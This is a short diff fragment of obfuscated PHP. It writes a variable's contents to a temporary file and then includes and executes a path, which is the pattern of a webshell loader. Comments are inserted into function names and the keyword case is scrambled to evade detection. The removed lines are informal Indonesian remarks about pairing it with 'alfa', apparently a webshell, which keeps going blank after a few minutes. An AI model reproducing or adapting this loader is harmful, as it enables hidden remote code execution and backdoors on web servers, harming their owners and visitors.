@@ -26,6 +26,3 @@ $path = $path/* r23 */ ['uri'];
 fprintf/* 3d45 */($tmp,'%s',$res); 
 ReqUire/* 23x4 *//* */$path;
 
-
-ini juga sih seharusnya kuat tahan lama kalau di pasangin alfa, ttp aja 3 menit lgsg blank 🫠
-buat insud
